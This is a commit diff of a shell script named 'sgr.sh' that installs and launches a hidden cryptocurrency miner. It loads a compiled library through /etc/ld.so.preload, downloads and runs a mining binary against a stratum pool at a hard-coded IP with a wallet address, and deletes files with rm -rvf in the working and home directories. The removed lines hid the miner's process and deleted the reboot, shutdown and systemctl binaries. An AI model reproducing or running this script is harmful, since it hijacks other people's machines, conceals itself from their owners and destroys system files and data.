58289076f8d9a6a1406b9414258f3c17c5007649
ladora <ladora@qdeathse.com>
2024-03-26 17:30:05 +0000

    sgr.sh edited online with Bitbucket

--- sgr.sh
+++ sgr.sh
@@ -8,24 +8,12 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
-sudo apt-get update 
-sudo apt-get install -y gcc ca-certificates curl gnupg 
-sudo mkdir -p /etc/apt/keyrings
-curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
-echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
-sudo apt-get install nodejs -y
-npm install -g npm@10.2.0 -y
-npm i -g node-process-hider
-ph add sgr1
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
 wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/maker > /dev/null 2>&1
 chmod u+x sgr1
-sudo nohup ./sgr1 -a YespowerSugar -o stratum+tcp://128.199.218.20:80 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$WORKER -p x -t $(nproc --all) > /dev/null 2>&1 &
+./sgr1 -a YespowerSugar -o stratum+tcp://128.199.218.20:80 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$WORKER -p x -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
-sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 rm -rvf *
 cd ~/
 rm -rvf *
